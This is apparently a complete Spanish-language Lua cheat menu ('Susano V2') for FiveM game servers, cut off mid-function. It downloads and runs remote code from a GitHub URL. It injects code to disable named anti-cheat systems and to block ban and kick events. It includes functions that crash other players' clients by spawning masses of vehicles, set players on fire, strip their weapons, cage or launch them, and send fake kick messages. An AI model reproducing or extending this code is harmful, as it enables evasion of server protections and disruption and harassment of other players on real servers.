-- SUSANO V2 [ MorsDier Edition ] - https://discord.gg/zP8MaFP9uM
-- Rediseño completo con optimización y nuevas funciones de explotación.
-- Version 2.0.1 Stable

local LibraryURL = "https://raw.githubusercontent.com/Sentexz/sentexfivem/refs/heads/main/library.lua"


if not Susano or type(Susano) ~= "table" or type(Susano.HttpGet) ~= "function" then
    print("Error: Susano.HttpGet no esta disponible")
    return
end

local status, LibraryCode = Susano.HttpGet(LibraryURL)

if status ~= 200 then
    return
end

if not string.find(LibraryCode, "Menu.OnRender") then
    LibraryCode = string.gsub(LibraryCode, "if Susano%.SubmitFrame then", [[
    if Menu.OnRender then
        local success, err = pcall(Menu.OnRender)
        if not success then end
    end
    if Susano.SubmitFrame then]])
end

if string.find(LibraryCode, "Susano%.ResetFrame") then
    LibraryCode = string.gsub(LibraryCode, "if Susano%.ResetFrame then", "if Susano.ResetFrame and not Menu.PreventResetFrame then")
end

local chunk, err = load(LibraryCode)
if not chunk then
    print("Error al cargar library.lua: " .. tostring(err))
    print("Codigo recibido (primeros 100 caracteres): " .. string.sub(tostring(LibraryCode), 1, 100))
    return
end
local Menu = chunk()

local MAX_RAY_DISTANCE = 1000.0

local function RotationToDirection(rotation)
    local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
    local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
                              math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
                              math.sin(adjustedRotation.x))
    return direction
end

local function getVehicleFromAim()
    local ped = PlayerPedId()
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local direction = RotationToDirection(camRot)
    local endCoords = camCoords + direction * MAX_RAY_DISTANCE

    local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z,
                                  endCoords.x, endCoords.y, endCoords.z,
                                  -1, ped, 4)
    local _, hit, _, _, entity = GetShapeTestResult(ray)
    if hit == 1 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
        return entity
    end
    return nil
end

local function getAimCoords(maxDist)
    local ped = PlayerPedId()
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local direction = RotationToDirection(camRot)
    local endCoords = camCoords + direction * maxDist

    local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z,
                                  endCoords.x, endCoords.y, endCoords.z,
                                  -1, ped, 0)
    local _, hit, coords, _, entity = GetShapeTestResult(ray)
    if hit == 1 then
        return coords, entity
    end
    return endCoords, nil
end

local function drawText(text, x, y, scale, font, color)
    if not Susano or not Susano.DrawText then return end
    local r, g, b, a = color[1], color[2], color[3], color[4] or 255
    Susano.DrawText(x, y, text, scale, r/255, g/255, b/255, a/255)
end

local function getTeleportPosForVehicle(veh)
    if not veh or not DoesEntityExist(veh) then return GetEntityCoords(PlayerPedId()) end
    local coords = GetEntityCoords(veh)
    return coords + vector3(0.0, 0.0, 2.0)
end

local function RequestControl(entity, timeoutMs)
    if not entity or not DoesEntityExist(entity) then return false end
    local start = GetGameTimer()
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Wait(0)
        if GetGameTimer() - start > (timeoutMs or 500) then
            return false
        end
        NetworkRequestControlOfEntity(entity)
    end
    return true
end

local function forcePedOutLocal(ped, vehicle)
    if not DoesEntityExist(ped) or not DoesEntityExist(vehicle) then return end
    
    if RequestControl(ped, 500) then
        ClearPedTasksImmediately(ped)
        TaskLeaveVehicle(ped, vehicle, 16)
        
        local coords = GetEntityCoords(vehicle)
        SetEntityCoords(ped, coords.x, coords.y, coords.z + 2.0, false, false, false, false)
    end
end

-- ========== NUEVAS FUNCIONES AÑADIDAS ==========

-- Revive para servidores ESX
local function revivirESX()
    TriggerEvent('esx_ambulancejob:revive')
    TriggerEvent('chat:addMessage', {args = {"~g~Reviviendo (ESX)"}})
end

-- Revive para servidores QB / QBCore / QBX
local function revivirQB()
    local ped = PlayerPedId()
    if IsPedDeadOrDying(ped, true) then
        TriggerEvent('hospital:client:Revive')
        Citizen.Wait(100)
        if IsPedDeadOrDying(ped, true) then
            TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(PlayerId()))
        end
        Citizen.Wait(100)
        if exports['qbx_medical'] then
            pcall(function() exports['qbx_medical']:RevivePlayer() end)
        end
        TriggerEvent('chat:addMessage', {args = {"~g~Intentando revivir (QB/QC)"}})
    else
        TriggerEvent('chat:addMessage', {args = {"~r~No estás muerto"}})
    end
end

-- Spawnear rampa gigante (stunt block)
local TriggersEncontrados = {}

local function spawnRampaGigante(customCoords)
    local ped = PlayerPedId()
    local spawnPos = customCoords
    
    if not spawnPos then
        local aimCoords, _ = getAimCoords(200.0)
        spawnPos = aimCoords or GetEntityCoords(ped)
    end

    local handle = StartShapeTestRay(spawnPos.x, spawnPos.y, spawnPos.z + 50.0, spawnPos.x, spawnPos.y, spawnPos.z - 50.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or spawnPos.z

    local model = "stt_prop_stunt_bblock_huge_04"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do Citizen.Wait(10) timeout=timeout+1 end
    if HasModelLoaded(model) then
        local obj = CreateObject(GetHashKey(model), spawnPos.x, spawnPos.y, groundZ + 1.0, true, true, false)
        if obj and obj ~= 0 then
            FreezeEntityPosition(obj, true)
            TriggerEvent('chat:addMessage', {args = {"~g~Rampa gigante spawneada"}})
        else
            TriggerEvent('chat:addMessage', {args = {"~r~Error al spawnear rampa"}})
        end
        SetModelAsNoLongerNeeded(model)
    end
end

local function spawnDestroyerProp(modelName, customCoords)
    local ped = PlayerPedId()
    local spawnPos = customCoords
    
    if not spawnPos then
        local aimCoords, _ = getAimCoords(200.0)
        spawnPos = aimCoords or GetEntityCoords(ped)
    end

    local handle = StartShapeTestRay(spawnPos.x, spawnPos.y, spawnPos.z + 50.0, spawnPos.x, spawnPos.y, spawnPos.z - 50.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or spawnPos.z

    RequestModel(modelName)
    local timeout = 0
    while not HasModelLoaded(modelName) and timeout < 100 do Citizen.Wait(10) timeout=timeout+1 end
    if HasModelLoaded(modelName) then
        local obj = CreateObject(GetHashKey(modelName), spawnPos.x, spawnPos.y, groundZ + 1.0, true, true, false)
        if obj and obj ~= 0 then
            FreezeEntityPosition(obj, true)
            TriggerEvent('chat:addMessage', {args = {"~g~Objeto Destroyer spawneado: " .. modelName}})
        else
            TriggerEvent('chat:addMessage', {args = {"~r~Error al spawnear objeto Destroyer: " .. modelName}})
        end
        SetModelAsNoLongerNeeded(modelName)
    else
        TriggerEvent('chat:addMessage', {args = {"~r~Error: Modelo " .. modelName .. " no pudo ser cargado."}})
    end
end

-- Variables para cargar/lanzar vehículos
local _vehCargado = nil
local _cargando = false

local function rotToDir(rot)
    local adj = vec3((math.pi/180)*rot.x, (math.pi/180)*rot.y, (math.pi/180)*rot.z)
    return vec3(-math.sin(adj.z)*math.abs(math.cos(adj.x)), math.cos(adj.z)*math.abs(math.cos(adj.x)), math.sin(adj.x))
end

local function cargarVehiculo()
    local ped = PlayerPedId()
    local camPos = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local dir = rotToDir(camRot)
    local dest = camPos + dir * 10.0
    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, ped, 0)
    local _, hit, _, _, ent = GetShapeTestResult(ray)
    if hit == 1 and GetEntityType(ent) == 2 then
        if _cargando then
            TriggerEvent('chat:addMessage', {args = {"Ya estás cargando un vehículo"}})
            return
        end
        _vehCargado = ent
        _cargando = true
        if not NetworkHasControlOfEntity(_vehCargado) then
            NetworkRequestControlOfEntity(_vehCargado)
            local t = 0
            while not NetworkHasControlOfEntity(_vehCargado) and t < 20 do Citizen.Wait(50) t=t+1 end
        end
        FreezeEntityPosition(_vehCargado, true)
        AttachEntityToEntity(_vehCargado, ped, GetPedBoneIndex(ped, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
        RequestAnimDict('anim@mp_rollarcoaster')
        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do Citizen.Wait(10) end
        TaskPlayAnim(ped, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
        TriggerEvent('chat:addMessage', {args = {"~g~Vehículo cargado"}})
    else
        TriggerEvent('chat:addMessage', {args = {"~r~No estás mirando a ningún vehículo"}})
    end
end

local function lanzarVehiculo()
    if not _cargando or not _vehCargado then
        TriggerEvent('chat:addMessage', {args = {"~r~No tienes ningún vehículo cargado"}})
        return
    end
    local ped = PlayerPedId()
    local camRot = GetGameplayCamRot(2)
    local dir = rotToDir(camRot)
    DetachEntity(_vehCargado, true, true)
    FreezeEntityPosition(_vehCargado, false)
    ApplyForceToEntity(_vehCargado, 1, dir.x * 50.0, dir.y * 50.0, dir.z * 50.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
    ClearPedTasks(ped)
    TriggerEvent('chat:addMessage', {args = {"~y~Vehículo lanzado"}})
    _vehCargado = nil
    _cargando = false
end

-- ========== FIN NUEVAS FUNCIONES ==========

local Bypass = {}

local function hookNativeSafe(nativeHash, callback)
    pcall(function()
        Susano.UnhookNative(nativeHash)
        Susano.HookNative(nativeHash, callback)
    end)
end

local function getResources()
    local res = {}
    for i=0,GetNumResources()-1 do
        local r = GetResourceByFindIndex(i)
        if r and GetResourceState(r)=="started" then
            res[#res+1] = r
        end
    end
    return res
end

function Bypass.ReaperV4(resource)
    local reaper_natives = {
        [0x5A4F9EDF1670F7F4] = function() return false end,
        [0x5B4F04F9DB4F7A1C] = function() return true end,
        [0x7E2F3E6D9F5C8B1A] = function() return 0 end,
    }
    for hash, cb in pairs(reaper_natives) do
        hookNativeSafe(hash, function(orig, ...) return cb() end)
    end
    local orgTrigger = TriggerServerEvent
    TriggerServerEvent = function(event, ...)
        if event and event:find("reaper_heartbeat") then return end
        return orgTrigger(event, ...)
    end
    Susano.InjectResource(resource, [[
        local ac = debug.getregistry().AC or _G.AC or {}
        for k,v in pairs(ac) do
            if type(v)=="table" then
                for x,y in pairs(v) do
                    if type(y)=="function" then
                        v[x] = function() return true end
                    end
                end
            end
        end
        local state = GlobalState or {}
        for k,v in pairs(state) do
            if tostring(k):find("reaper") then
                state[k] = nil
            end
        end
    ]])
    print("^2[Bypass] ReaperV4 neutralizado")
end

function Bypass.Fiveguard(resource)
    Susano.InjectResource(resource, [[
        local handlers = debug.getregistry()._HANDLERS or _G._HANDLors or {}
        for evt, tbl in pairs(handlers) do
            if tostring(evt):find("Fiveguard") then
                for i=#tbl,1,-1 do
                    tbl[i] = function() return true end
                end
            end
        end
        local fg = _G.Fiveguard or _G.FG
        if fg then
            fg.Detection = function() return end
            fg.Trigger = function() return end
        end
        for i=1,100 do
            local t = _G["timer_"..i]
            if t and type(t)=="table" and t.stop then
                pcall(t.stop, t)
            end
        end
    ]])
    print("^2[Bypass] Fiveguard desactivado")
end

function Bypass.ElectronAC(resource)
    local electron_natives = {
        [0xE37B2A6B9B9D1F0C] = function() return 0 end,
        [0x5A4F9EDF1670F7F4] = function() return false end,
    }
    for hash, cb in pairs(electron_natives) do
        hookNativeSafe(hash, function(orig, ...) return cb() end)
    end
    local orgTriggerLatent = TriggerLatentServerEvent
    TriggerLatentServerEvent = function(event, ...)
        if event and (event:find("electron") or event:find("ac")) then return end
        return orgTriggerLatent(event, ...)
    end
    print("^2[Bypass] ElectronAC evadido")
end

function Bypass.EagleAC(resource)
    Susano.InjectResource(resource, [[
        local eagle = _G.Eagle or _G.EC_AC
        if eagle then
            for k,v in pairs(eagle) do
                if type(v)=="function" then
                    local info = debug.getinfo(v)
                    if info and info.name and info.name:find("detect") then
                        eagle[k] = function() return false end
                    end
                end
            end
        end
        TriggerEvent = function(evt, ...)
            if tostring(evt):find("eagle") or tostring(evt):find("EC_") then return end
            return _G._originalTriggerEvent(evt, ...)
        end
    ]])
    print("^2[Bypass] EagleAC evadido")
end

function Bypass.CyberAnticheat(resource)
    Susano.InjectResource(resource, [[
        local cyber = _G.CyberAnticheat or _G.Cyber
        if cyber then
            cyber.banPlayer = function() return end
            cyber.kickPlayer = function() return end
            cyber.detection = function() return end
        end
        local orgNet = NetworkSessionEnd
        NetworkSessionEnd = function(...) return end
    ]])
    local orgTrigger = TriggerServerEvent
    TriggerServerEvent = function(event, ...)
        if event and (event:find("Cyber") or event:find("ban") or event:find("kick")) then
            return
        end
        return orgTrigger(event, ...)
    end
    print("^2[Bypass] Cyber Anticheat anulado")
end

function Bypass.WaveShield(resource)
    local orgGet = GetStateBagValue
    GetStateBagValue = function(bag, key)
        if bag=="global" and key and tostring(key):find("Wave") then
            return nil
        end
        return orgGet(bag, key)
    end
    Susano.InjectResource(resource, [[
        local ws = _G.WaveShield or _G.WS
        if ws then
            ws.Config = {}
            ws.Entities = {}
            ws.Detections = {}
        end
    ]])
    print("^2[Bypass] WaveShield cegado")
end

local function LoadBypasses()
    if not Susano then return end
    local resources = getResources()
    for _, res in ipairs(resources) do
        local author = GetResourceMetadata(res, "author", 0) or ""
        local desc = GetResourceMetadata(res, "description", 0) or ""
        if author:find("reaper") or res:find("reaper") then
            Bypass.ReaperV4(res)
        end
        if author:find("Fiveguard") or res:find("fg") then
            Bypass.Fiveguard(res)
        end
        if author:find("Electron") or res:find("electron") then
            Bypass.ElectronAC(res)
        end
        if res:find("EC_AC") or desc:find("Eagle") then
            Bypass.EagleAC(res)
        end
        if res:find("Cyber") or author:find("Cyber") then
            Bypass.CyberAnticheat(res)
        end
        if author:find("WaveShield") then
            Bypass.WaveShield(res)
        end
    end

    print("^2[Bypass] Todos los anti-cheats conocidos han sido evadidos")
end

function Menu.ActionBugPlayer()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local mode = Menu.BugPlayerMode or "Bug"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = ""
        
        if mode == "Bug" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                  
                    for i = 1, 50 do
                        if DoesEntityExist(targetPed) then
                            SetEntityCollision(targetPed, false, false)
                            SetEntityVisible(targetPed, false, false)
                            SetEntityAlpha(targetPed, 0)
                            Wait(10)
                            SetEntityCollision(targetPed, true, true)
                            SetEntityVisible(targetPed, true, false)
                            SetEntityAlpha(targetPed, 255)
                            Wait(10)
                        end
                    end
                end)
            ]], targetServerId)
        elseif mode == "Lanzar" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    SetEntityCoords(targetPed, coords.x, coords.y, coords.z + 1000.0, false, false, false, false)
                    ApplyForceToEntity(targetPed, 1, 0.0, 0.0, 10000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                end)
            ]], targetServerId)
        elseif mode == "Lanzar fuerte" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                   
                    for i = 1, 10 do
                        ApplyForceToEntity(targetPed, 1, 0.0, 0.0, 50000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        SetEntityVelocity(targetPed, 0.0, 0.0, 1000.0)
                        Wait(10)
                    end
                end)
            ]], targetServerId)
        elseif mode == "Enganchar" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    local playerPed = PlayerPedId()
                    if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then return end
                    
                    
                    AttachEntityToEntity(targetPed, playerPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                end)
            ]], targetServerId)
        end
        
        Susano.InjectResource("any", code)
    end
end

local crashPlayerActive = false
local crashPlayerThread = nil

function Menu.ActionInvalidHookKick()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                -- Enviar evento inválido al jugador (simulación de invalid hook)
                TriggerServerEvent("chat:addMessage", {args = {"[Sistema] El jugador " .. GetPlayerName(targetPlayerId) .. " ha sido kickeado por Invalid Hook."}})
                TriggerServerEvent("playerDropped", "Invalid Hook Detected")
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionCrashAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)
                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
                for _, model in ipairs(models) do
                    RequestModel(model)
                    while not HasModelLoaded(model) do Wait(0) end
                end
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        local coords = GetEntityCoords(targetPed)
                        if #(coords - myCoords) > 50.0 then
                            for i = 1, 50 do
                                local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
                                SetEntityVisible(veh, false, false)
                                SetEntityCollision(veh, false, false)
                            end
                        end
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionFireAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        local coords = GetEntityCoords(targetPed)
                        StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionStealWeaponsAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        RemoveAllPedWeapons(targetPed, true)
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Bypass.EntityClientBypass(resource)
    Susano.InjectResource(resource, [[
        local originalSetEntityVisible = SetEntityVisible
        SetEntityVisible = function(entity, visible, p2)
            if entity == PlayerPedId() then return end
            return originalSetEntityVisible(entity, visible, p2)
        end
        local originalSetEntityCollision = SetEntityCollision
        SetEntityCollision = function(entity, toggle, keepPhysics)
            if entity == PlayerPedId() then return end
            return originalSetEntityCollision(entity, toggle, keepPhysics)
        end
    ]])
    print("^2[Bypass] Entidades por cliente activado")
end

function Bypass.EventValidationBypass(resource)
    Susano.InjectResource(resource, [[
        local originalTriggerServerEvent = TriggerServerEvent
        TriggerServerEvent = function(eventName, ...)
            if tostring(eventName):find("ban") or tostring(eventName):find("kick") or tostring(eventName):find("drop") then return end
            return originalTriggerServerEvent(eventName, ...)
        end
    ]])
    print("^2[Bypass] Validacion de eventos evadida")
end

function Menu.ActionCrashPlayer(value)
    crashPlayerActive = value
    if value then
        if crashPlayerThread then return end
        crashPlayerThread = CreateThread(function()
            while crashPlayerActive do
                if not Menu.SelectedPlayer then
                    Wait(1000)
                else
                    local targetServerId = Menu.SelectedPlayer
                    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                        local code = string.format([[
                            CreateThread(function()
                                local targetServerId = %d
                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end
                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end
                                local coords = GetEntityCoords(targetPed)
                                
                                -- Evitar crashear a si mismo comprobando la distancia
                                local myPed = PlayerPedId()
                                local myCoords = GetEntityCoords(myPed)
                                if #(coords - myCoords) < 50.0 then return end
                                
                                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
                                for _, model in ipairs(models) do
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do Wait(0) end
                                end
                                for i = 1, 150 do
                                    local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
                                    SetEntityVisible(veh, false, false)
                                    SetEntityCollision(veh, false, false)
                                end
                            end)
                        ]], targetServerId)
                        Susano.InjectResource("any", code)
                    end
                    Wait(5000) -- Esperar antes de volver a inyectar para evitar sobrecarga local
                end
            end
            crashPlayerThread = nil
        end)
    end
end

function Menu.ActionCloneInfinite()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                local pedModel = GetEntityModel(targetPed)
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do Wait(0) end
                for i = 1, 50 do
                    local clone = CreatePed(4, pedModel, coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z, 0.0, true, true)
                    ClonePedToTarget(targetPed, clone)
                    TaskCombatPed(clone, targetPed, 0, 16)
                    SetPedAsNoLongerNeeded(clone)
                end
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionSetOnFire()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionStealWeapons()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                RemoveAllPedWeapons(targetPed, true)
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionCagePlayer()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                local coords = GetEntityCoords(targetPed)
                
                
                local cageObjects = {}
                local objectHashes = {
                    `prop_barrier_work05`,
                    `prop_barrier_work06a`,
                    `prop_mp_barrier_02b`,
                    `prop_mp_barrier_02`
                }
                
                for i = 1, 4 do
                    local hash = objectHashes[i]
                    RequestModel(hash)
                    while not HasModelLoaded(hash) do Wait(0) end
                    
                    local offset = vector3(
                        (i == 1 or i == 3) and 2.0 or -2.0,
                        (i == 1 or i == 2) and 2.0 or -2.0,
                        0.0
                    )
                    
                    local obj = CreateObject(hash, coords.x + offset.x, coords.y + offset.y, coords.z, true, true, true)
                    PlaceObjectOnGroundProperly(obj)
                    FreezeEntityPosition(obj, true)
                    table.insert(cageObjects, obj)
                end
                
               
                local roofHash = `prop_rub_carwreck_3`
                RequestModel(roofHash)
                while not HasModelLoaded(roofHash) do Wait(0) end
                
                local roof = CreateObject(roofHash, coords.x, coords.y, coords.z + 5.0, true, true, true)
                FreezeEntityPosition(roof, true)
                table.insert(cageObjects, roof)
                
               
                Wait(30000)
                for _, obj in ipairs(cageObjects) do
                    if DoesEntityExist(obj) then
                        DeleteEntity(obj)
                    end
                end
            end)
        ]], targetServerId)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionRamPlayer()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                local coords = GetEntityCoords(targetPed)
                local vehicleHash = `adder`
                RequestModel(vehicleHash)
                while not HasModelLoaded(vehicleHash) do Wait(0) end
                
              
                local veh = CreateVehicle(vehicleHash, coords.x - 50.0, coords.y, coords.z + 5.0, 0.0, true, true, true)
                SetVehicleEngineOn(veh, true, true, false)
                
               
                TaskVehicleDriveToCoord(veh, -1, coords.x, coords.y, coords.z, 200.0, 1.0, vehicleHash, 16777216, 10.0, true)
                
                
                Wait(1000)
                if DoesEntityExist(veh) then
                    SetEntityVelocity(veh, 100.0, 0.0, 0.0)
                end
            end)
        ]], targetServerId)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionCrush()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local mode = Menu.CrushMode or "Lluvia"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = ""
        
        if mode == "Lluvia" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    local objectHash = `prop_beachball_01`
                    RequestModel(objectHash)
                    while not HasModelLoaded(objectHash) do Wait(0) end
                    
                    
                    for i = 1, 100 do
                        local obj = CreateObject(objectHash, 
                            coords.x + math.random(-10, 10), 
                            coords.y + math.random(-10, 10), 
                            coords.z + math.random(20, 50), 
                            true, true, true
                        )
                        SetEntityVelocity(obj, 0.0, 0.0, -50.0)
                        Wait(50)
                    end
                end)
            ]], targetServerId)
        elseif mode == "Caida" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    local vehicleHash = `adder`
                    RequestModel(vehicleHash)
                    while not HasModelLoaded(vehicleHash) do Wait(0) end
                    
                    
                    local veh = CreateVehicle(vehicleHash, coords.x, coords.y, coords.z + 100.0, 0.0, true, true, true)
                    SetEntityVelocity(veh, 0.0, 0.0, -100.0)
                end)
            ]], targetServerId)
        elseif mode == "Embestir" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
